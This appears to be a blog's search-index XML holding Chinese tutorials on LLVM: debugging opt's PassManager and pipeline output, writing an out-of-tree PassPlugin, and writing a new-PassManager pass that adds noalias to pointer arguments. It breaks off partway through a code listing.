<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>学会调试 LLVM opt 中的 PassManager 和 AnalysisManager</title>
      <link href="/2022/04/16/llvm-debug-pipeline/"/>
      <url>/2022/04/16/llvm-debug-pipeline/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PassManager 和 AnalysisManager 是 LLVM 中非常复杂的一部分代码，它们需要管理上百个 Passes 和 Analyses 的交互，所以当我们优化一个程序的时候想要找出 opt 引入的问题会比较困难，而 opt 提供了一些选项来帮助我们更好的调试错误。</p><hr><h2 id="输出-Pass-Pipeline-信息"><a href="#输出-Pass-Pipeline-信息" class="headerlink" title="输出 Pass  Pipeline 信息"></a>输出 Pass  Pipeline 信息</h2><p>LLVM 中有很多不同的优化等级，如 <code>-O0</code>、<code>-O1</code>、<code>-O2</code>、<code>-Oz</code>，不同的优化等级会运行一组不同的 Passes，而且这组 Passes 的运行顺序也会不一致。在某些情况下，这会极大的影响到优化后生成代码的效率和正确性。为了打印出所有的被运行的 Passes 和他们运行的顺序，可以使用 <code>--debug-pass-manager</code> 命令行选项。假设有如下待优化代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bar</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> y = x;</span><br><span class="line">    <span class="keyword">return</span> y * <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> z + z * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先利用 clang 将其编译为 IR：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> clang -O0 -Xclang -disable-O0-optnone -emit-llvm -S test.c</span></span><br></pre></td></tr></table></figure><blockquote><p><code>-disable-O0-optnone</code> 选项：默认情况下，如果 clang 被指定了 <code>-O0</code> 优化等级，则会为每一个函数附加一个 <strong>optnone</strong> 的属性，这个属性在 opt 运行时会阻止对其函数的进一步的优化（除非 Pass 实现的成员函数 isRequried 永远返回 true）。所以，<code>-disable-O0-optnone</code> 选项会阻止 clang 为函数附加 <code>optnone</code> 属性，保证后续优化过程的进行。</p></blockquote><p>然后运行 opt：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> opt -O2 --disable-output --debug-pass-manager test.ll</span></span><br><span class="line">Starting llvm::Module pass manager run.</span><br><span class="line">...</span><br><span class="line">Running pass: Annotation2MetadataPass on ./test.ll</span><br><span class="line">Running pass: ForceFunctionAttrsPass on ./test.ll</span><br><span class="line">...</span><br><span class="line">Starting llvm::Function pass manager run.</span><br><span class="line">Running pass: SimplifyCFGPass on bar</span><br><span class="line">Running pass: SROA on bar</span><br><span class="line">Running analysis: DominatorTreeAnalysis on bar</span><br><span class="line">Running pass: EarlyCSEPass on bar</span><br><span class="line">...</span><br><span class="line">Finished llvm::Function pass manager run.</span><br><span class="line">...</span><br><span class="line">Starting llvm::Function pass manager run.</span><br><span class="line">Running pass: SimplifyCFGPass on foo</span><br><span class="line">...</span><br><span class="line">Finished llvm::Function pass manager run.</span><br><span class="line">Invalidating analysis: VerifierAnalysis on ./test.ll</span><br><span class="line">...</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><hr><h2 id="输出在运行-Pass-后-IR-产生的变化"><a href="#输出在运行-Pass-后-IR-产生的变化" class="headerlink" title="输出在运行 Pass 后 IR 产生的变化"></a>输出在运行 Pass 后 IR 产生的变化</h2><p>理解一个 transformation Pass 对 IR 所造成的影响，最好的办法就是比较运行前后 IR 的变化。</p><ol><li>通过使用 <code>--print-changed</code> 命令行选项，则可以打印出经过 Pass 处理后，产生变化的 IR。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> opt -O2 --disable-output --print-changed ./test.ll</span></span><br><span class="line">*** IR Dump At Start: ***</span><br><span class="line">...</span><br><span class="line">define dso_local i32 @bar(i32 %x) #0 &#123;</span><br><span class="line">entry:</span><br><span class="line">    %x.addr = alloca i32, align 4</span><br><span class="line">    %y = alloca i32, align 4</span><br><span class="line">    …</span><br><span class="line">    %1 = load i32, i32* %y, align 4</span><br><span class="line">    %mul = mul nsw i32 %1, 4</span><br><span class="line">    ret i32 %mul</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">*** IR Dump After VerifierPass (module) omitted because no change ***</span><br><span class="line">...</span><br><span class="line">*** IR Dump After SROA *** (function: bar)</span><br><span class="line">; Function Attrs: noinline nounwind uwtable</span><br><span class="line">define dso_local i32 @bar(i32 %x) #0 &#123;</span><br><span class="line">entry:</span><br><span class="line">    %mul = mul nsw i32 %x, 4</span><br><span class="line">    ret i32 %mul</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><ol start="2"><li><strong>指定某些函数的变化</strong>，使用 <code>--filter-print-funcs=&lt;function names&gt;</code> 命令行选项。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> opt -O2 --disable-output --print-changed --filter-print-funcs=foo ./test.ll</span></span><br><span class="line">...</span><br><span class="line">*** IR Dump After SROAPass on foo ***</span><br><span class="line">; Function Attrs: noinline nounwind uwtable</span><br><span class="line">define dso_local i32 @foo(i32 noundef %z) #0 &#123;</span><br><span class="line">entry:</span><br><span class="line"><span class="meta">  %</span><span class="bash">mul = mul nsw i32 %z, 2</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">add = add nsw i32 %z, %mul</span></span><br><span class="line">  ret i32 %add</span><br><span class="line">&#125;</span><br><span class="line">*** IR Dump After EarlyCSEPass on foo omitted because no change ***</span><br><span class="line">...</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><ol start="3"><li><strong>指定某些 Pass 引起的变化</strong>，使用 <code>--filter-passes=&lt;Pass names&gt;</code>  命令行选项。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> opt -O2 --disable-output --print-changed --filter-passes=SROA,InstCombinePass ./test.ll</span></span><br><span class="line">...</span><br><span class="line">*** IR Dump After InstCombinePass on bar ***</span><br><span class="line">; Function Attrs: noinline nounwind uwtable</span><br><span class="line">define dso_local i32 @bar(i32 noundef %x) local_unnamed_addr #0 &#123;</span><br><span class="line">entry:</span><br><span class="line"><span class="meta">  %</span><span class="bash">mul = shl nsw i32 %x, 2</span></span><br><span class="line">  ret i32 %mul</span><br><span class="line">&#125;</span><br><span class="line">*** IR Dump After SimplifyCFGPass on bar filtered out ***</span><br><span class="line">*** IR Pass PassManager&lt;llvm::Function&gt; on bar ignored ***</span><br><span class="line">*** IR Dump After InstCombinePass on foo ***</span><br><span class="line">; Function Attrs: noinline nounwind uwtable</span><br><span class="line">define dso_local i32 @foo(i32 noundef %z) local_unnamed_addr #0 &#123;</span><br><span class="line">entry:</span><br><span class="line"><span class="meta">  %</span><span class="bash">add = mul nsw i32 %z, 3</span></span><br><span class="line">  ret i32 %add</span><br><span class="line">&#125;</span><br><span class="line">*** IR Dump After SimplifyCFGPass on foo filtered out ***</span><br><span class="line">...</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><hr><h2 id="仅运行-Pipeline-中的前-N-个Pass"><a href="#仅运行-Pipeline-中的前-N-个Pass" class="headerlink" title="仅运行 Pipeline 中的前 N 个Pass"></a>仅运行 Pipeline 中的前 N 个Pass</h2><p>利用命令行选项 <code>--opt-bisect-limit=&lt;N&gt;</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> opt test.ll -O2 --opt-bisect-limit=6 -S -o ./test_after_opt.ll</span></span><br><span class="line">...</span><br><span class="line">BISECT: running pass (1) Annotation2MetadataPass on [module]</span><br><span class="line">BISECT: running pass (2) ForceFunctionAttrsPass on [module]</span><br><span class="line">BISECT: running pass (3) InferFunctionAttrsPass on [module]</span><br><span class="line">BISECT: running pass (4) LowerExpectIntrinsicPass on bar</span><br><span class="line">BISECT: running pass (5) SimplifyCFGPass on bar</span><br><span class="line">BISECT: running pass (6) SROAPass on bar</span><br><span class="line">BISECT: NOT running pass (7) EarlyCSEPass on bar</span><br><span class="line">BISECT: NOT running pass (8) LowerExpectIntrinsicPass on foo</span><br><span class="line">BISECT: NOT running pass (9) SimplifyCFGPass on foo</span><br><span class="line">BISECT: NOT running pass (10) SROAPass on foo</span><br><span class="line">...</span><br><span class="line"><span class="meta">$</span><span class="bash"> cat ./test_after_opt.ll</span></span><br><span class="line">; ModuleID = &#x27;test.ll&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-unknown-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind uwtable</span><br><span class="line">define dso_local i32 @bar(i32 noundef %x) #0 &#123;</span><br><span class="line">entry:</span><br><span class="line"><span class="meta">  %</span><span class="bash">mul = mul nsw i32 %x, 4</span></span><br><span class="line">  ret i32 %mul</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind uwtable</span><br><span class="line">define dso_local i32 @foo(i32 noundef %z) #0 &#123;</span><br><span class="line">entry:</span><br><span class="line"><span class="meta">  %</span><span class="bash">z.addr = alloca i32, align 4</span></span><br><span class="line">  store i32 %z, i32* %z.addr, align 4</span><br><span class="line"><span class="meta">  %</span><span class="bash">0 = load i32, i32* %z.addr, align 4</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">1 = load i32, i32* %z.addr, align 4</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">mul = mul nsw i32 %1, 2</span></span><br><span class="line"><span class="meta">  %</span><span class="bash">add = add nsw i32 %0, %mul</span></span><br><span class="line">  ret i32 %add</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind uwtable &quot;frame-pointer&quot;=&quot;all&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0, !1, !2&#125;</span><br><span class="line">!llvm.ident = !&#123;!3&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;i32 7, !&quot;uwtable&quot;, i32 1&#125;</span><br><span class="line">!2 = !&#123;i32 7, !&quot;frame-pointer&quot;, i32 2&#125;</span><br><span class="line">!3 = !&#123;!&quot;clang version 14.0.0 (/home/nino/llvm-project-14.0.0/clang 1c1a6409f8fe10e79867002777d07d599276759e)&quot;&#125;</span><br></pre></td></tr></table></figure><p>可以看到，只有 bar 函数经过了 SROA 优化，而 func 函数却没有。</p><hr><blockquote><p>参考资料：<em>LLVM Techniques, Tips, and Best Practices</em></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> LLVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LLVM </tag>
            
            <tag> Pass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>怎么基于 Pass New Manager 利用 PassPlugin 写 LLVM Pass（out-of-tree Pass Development）</title>
      <link href="/2022/04/16/llvm-pass-plugin/"/>
      <url>/2022/04/16/llvm-pass-plugin/</url>
      
        <content type="html"><![CDATA[<p>直接修改 LLVM 的源代码添加 Pass，不仅仅要写 Pass 的实现，还要写修改其他文件来保证的 Pass 注册，过程不繁琐，但是由于 LLVM Code Base 巨大，一点点小的修改编译链接要花费很长时间（特别是我这可怜的 16G 机器，每次还得增加虚存空间才能保证链接的时候内存不爆掉）。为了克服这种操蛋的问题，LLVM 提供了 PassPlugin 机制，使得我们可以将自己的 Pass 编译成动态库，然后通过 opt 动态的加载运行，实现 out-of-tree 的 Pass Development。如下 Pass 展示 PassPlugin 的使用：</p><ol><li><p>写出新 Pass 的主体部分：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/PassManager.h&quot;</span><span class="comment">// 用来写Pass</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Passes/PassPlugin.h&quot;</span><span class="comment">// 提供Plugin接口</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> :</span> <span class="keyword">public</span> llvm::PassInfoMixin&lt;HelloWorld&gt; &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/// FunctionPass，简单的打印出每个函数的名字和参数个数</span></span><br><span class="line">    <span class="function">llvm::PreservedAnalyses <span class="title">run</span><span class="params">(llvm::Function &amp;F, llvm::FunctionAnalysisManager &amp;)</span> </span>&#123;</span><br><span class="line">        llvm::<span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Visiting: &quot;</span>;</span><br><span class="line">        llvm::<span class="built_in">errs</span>() &lt;&lt; F.<span class="built_in">getName</span>() &lt;&lt; <span class="string">&quot; (takes &quot;</span>;</span><br><span class="line">        llvm::<span class="built_in">errs</span>() &lt;&lt; F.<span class="built_in">arg_size</span>() &lt;&lt; <span class="string">&quot; args)\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> llvm::PreservedAnalyses::<span class="built_in">all</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Without isRequired returning true, this pass will be skipped for functions</span></span><br><span class="line">    <span class="comment">// decorated with the optnone LLVM attribute. Note that clang -O0 decorates</span></span><br><span class="line">    <span class="comment">// all functions with optnone.</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">isRequired</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>注册 Pass</p><p>PassPlugin 最主要的作用就是提供用户注册 Pass 的接口。通过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PassBuilderHook</span><span class="params">(llvm::PassBuilder &amp;PB)</span> </span>&#123;</span><br><span class="line">    PB.<span class="built_in">registerPipelineParsingCallback</span>([](llvm::StringRef Name, llvm::FunctionPassManager &amp;FPM, llvm::ArrayRef&lt;llvm::PassBuilder::PipelineElement&gt;) -&gt; <span class="keyword">bool</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (Name != <span class="string">&quot;hello-world&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        FPM.<span class="built_in">addPass</span>(<span class="built_in">HelloWorld</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::PassPluginLibraryInfo <span class="title">getHelloWorldPluginLibraryInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;LLVM_PLUGIN_API_VERSION, <span class="string">&quot;hello-world&quot;</span>, LLVM_VERSION_STRING, PassBuilderHook&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">LLVM_ATTRIBUTE_WEAK llvm::PassPluginLibraryInfo <span class="title">llvmGetPassPluginInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">getHelloWorldPluginLibraryInfo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编写 CMakeLists</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.4</span>.<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span>(LLVM_PASS_LEARN)</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD <span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">find_package</span>(LLVM REQUIRED CONFIG)</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_directories</span>(<span class="variable">$&#123;LLVM_INCLUDE_DIRS&#125;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">NOT</span> LLVM_ENABLE_RTTI)</span><br><span class="line">    <span class="keyword">set</span>(CMAKE_CXX_FLAGS <span class="string">&quot;$&#123;CMAKE_CXX_FLAGS&#125; -fno-rtti&quot;</span>)</span><br><span class="line"><span class="keyword">endif</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译链接为共享库</span></span><br><span class="line"><span class="keyword">add_library</span>(HelloWorld SHARED HelloWorld.cpp)</span><br></pre></td></tr></table></figure></li><li><p>利用 opt 运行 Pass</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 编译目标文件为IR</span><br><span class="line">clang -emit-llvm -c -g test.c -o test.bc</span><br><span class="line"></span><br><span class="line"># 运行opt</span><br><span class="line">opt --load-pass-plugin=./libHelloWorld.so --passes=<span class="string">&quot;hello-world&quot;</span> test.bc</span><br></pre></td></tr></table></figure></li></ol><hr><blockquote><p>参考文献：<a href="https://llvm.org/devmtg/2019-10/slides/Warzynski-WritingAnLLVMPass.pdf">Writing an LLVM Pass: 101 - LLVM 2019 tutorial</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> LLVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LLVM </tag>
            
            <tag> Pass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>怎样在 opt 中利用 new PassManager 中写 Pass</title>
      <link href="/2022/04/16/llvm-new-pass-manager/"/>
      <url>/2022/04/16/llvm-new-pass-manager/</url>
      
        <content type="html"><![CDATA[<p>LLVM 开发团队曾说在 LLVM 14 以后将要移除 legacy PassManager，以前写 Pass 都是基于 Legacy PassManager 完成的，为了以后更好的适应更高版本的 LLVM，学习一下在 new PassManager 中写 Pass。</p><blockquote><p>Quote: “Using the legacy pass manager for the optimization pipeline is deprecated and will be removed after LLVM 14.”</p></blockquote><p>目标：基于 new PassManager 实现一个简单的小 Pass，为函数的每个指针参数添加 <strong>noalias</strong> 属性。</p><ol><li>创建需要编写 Pass 的头文件和源文件。</li></ol><ul><li><code>llvm/include/llvm/Transforms/Utils/StrictOpt.h</code> 存放头文件</li><li><code>llvm/lib/Transforms/Utils/StrictOpt.cpp</code> 存放源文件，需要注意修改 CMakeLists 将源文件加入到其中。</li></ul><ol start="2"><li>编写头文件</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/PassManager.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> llvm &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">StrictOpt</span> :</span> <span class="keyword">public</span> PassInfoMixin&lt;ScriptOpt&gt; &#123;<span class="comment">// CRTP</span></span><br><span class="line">    <span class="function">PreservedAnalyses <span class="title">run</span><span class="params">(Function &amp;F, FunctionAnalysisManager &amp;FAM)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="title">isRequired</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125; <span class="comment">// 官方简介中没有加入这行代码也能跑起来，但是我在实验的时候没加在pass被run之前就被过滤掉了，好像和PassInstrumentation有关，但目前还没完全搞清（总之，这也不是这节的重点啦）</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处实现的是一个 function pass，它运行于每个函数 IR 单元之上。run 方法是这个 pass 的主要入口点，也是后续需要实现 pass 功能的方法。</p><p>run 方法接收两个参数，第一个参数是将进行分析的 Function，第二个参数 FunctionAnalysisManager 提供一些 analysis 数据。由于 transform pass 可能会改变 IR，导致之前的 analysis pass 得到的信息失效，所以 run 方法的返回值代表的是经过这个 pass 后，<strong>仍然有效</strong>的 analysis 数据。</p><ol start="3"><li>实现 run 方法</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/Utils/StrictOpt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Analysis/AliasAnalysis.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="function">PreservedAnalyses <span class="title">StrictOpt::run</span><span class="params">(Function &amp;F, FunctionAnalysisManager &amp;FAM)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> modified = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;arg : F.<span class="built_in">args</span>()) &#123;</span><br><span class="line">    <span class="comment">// 如果参数的类型是指针类型，且不具有NoAlias属性，则为其添加该属性</span></span><br><span class="line">    <span class="keyword">if</span> (arg.<span class="built_in">getType</span>()-&gt;<span class="built_in">isPointerTy</span>() &amp;&amp; !arg.<span class="built_in">hasAttribute</span>(Attribute::NoAlias)) &#123;</span><br><span class="line">      arg.<span class="built_in">addAttr</span>(Attribute::NoAlias);</span><br><span class="line">      modified |= <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> PA = PreservedAnalyses::<span class="built_in">all</span>();</span><br><span class="line">  <span class="keyword">if</span> (modified)</span><br><span class="line">    PA.abandon&lt;AAManager&gt;();<span class="comment">// 如果有指针参数被添加了NoAlias属性，则应该摒弃原有的指针分析结果</span></span><br><span class="line">  <span class="keyword">return</span> PA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>注册 pass</li></ol><p>在 <code>llvm/lib/Passes/PassRegistry.def</code> 文件中的 <font color='yellow'><strong>FUNCTION_PASS</strong></font> 段加入</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">FUNCTION_PASS</span>(<span class="string">&quot;strict-opt&quot;</span>, <span class="built_in">StrictOpt</span>())<span class="comment">// 该行代码指定命令行中激活对应pass所需要输入的名称</span></span><br></pre></td></tr></table></figure><p>同时在 <code>llvm/lib/Passes/PassBuilder.cpp</code> 文件中加入以下头文件包含我们 pass 的头文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/Utils/StrictOpt.h&quot;</span></span></span><br></pre></td></tr></table></figure><p>当 opt 拿到了 pass 的名称，则会根据识别到的名称创建出对应的 pass 对象，并将其加入到 PassManager 中。新版的 pass 注册机制也不在使用 legacy Register 那一套了，利用宏实现的全新代码~</p><ol start="5"><li>运行</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 